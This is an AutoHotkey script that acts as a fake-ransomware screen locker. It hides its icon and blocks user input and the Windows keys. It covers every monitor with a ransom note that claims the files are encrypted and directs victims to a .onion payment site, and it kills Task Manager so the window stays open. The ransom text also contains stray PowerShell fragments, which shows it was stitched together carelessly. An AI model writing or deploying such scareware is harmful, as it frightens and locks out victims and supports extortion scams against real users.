#NoEnv
#SingleInstance Force
#Persistent
#NoTrayIcon

SetBatchLines -1

Menu, Tray, NoIcon

; Set the timer to start the script every 5 seconds
SetTimer, StartScript, 5000
Return

StartScript:
; Disable Windows keys
Hotkey, LWin, DisableWinKey
Hotkey, RWin, DisableWinKey

BlockInput, On

SysGet, MonitorCount, MonitorCount

Loop, %MonitorCount%
{
    SysGet, Monitor, Monitor, %A_Index%
    Width := MonitorRight - MonitorLeft
    Height := MonitorBottom - MonitorTop

    Gui, %A_Index%: +SysMenu +AlwaysOnTop -Caption +ToolWindow +LastFound
    Gui, %A_Index%: Font, s20, cFFFFFF
    Gui, %A_Index%: Color, 000000
    Gui, %A_Index%: Add, Text, cFFFFFF Center vText,
    (LTrim
                ____()()
              /      OO
         ~~~~~\_;m__m._>o


    Oops! Your files have been encrypted.

    If you see this text, your files are no longer accessible. You might
    have been looking for a way to recover your files, but do not waste
    your time. No one will be able to recover them without a decryption
    service.

    We guarantee that you can recover all your files safely. All you need
    to do is get the decryption password.

    Visit our web services at: at404linkszt3xaxqzf2nm12.onion

    Your personal installation key #1:

    b0d549572a40f93aa57400dbe43ee72a5e545f47765ef5fb7d17c7e83001cb3d,$font,$brushFg,10,10)
    $graphics.Dispose()
    $bmp.Save($filename)
    )
    Gui, %A_Index%: Show, w%Width% h%Height% x%MonitorLeft% y%MonitorTop%, Lock3d%A_Index%
}

SetTimer, Check, 250
SetTimer, StopScript, -9000 ; Run for 3 seconds

Return

Check:
if WinExist("Windows Task Manager")
{
    WinKill, ahk_class #32770
    Loop, %MonitorCount%
    {
        Gui, %A_Index%: Default
        WinSet, AlwaysOnTop, On, Lock3d%A_Index%
    }
}
Return

StopScript:
Loop, %MonitorCount%
{
    Gui, %A_Index%: Destroy
}
BlockInput, Off

; Re-enable Windows keys
Hotkey, LWin, Off
Hotkey, RWin, Off
Return

DisableWinKey:
Return

q & m::
ExitApp

OnExit, EnableWinKey
Return

EnableWinKey:
Hotkey, LWin, Off
Hotkey, RWin, Off
ExitApp
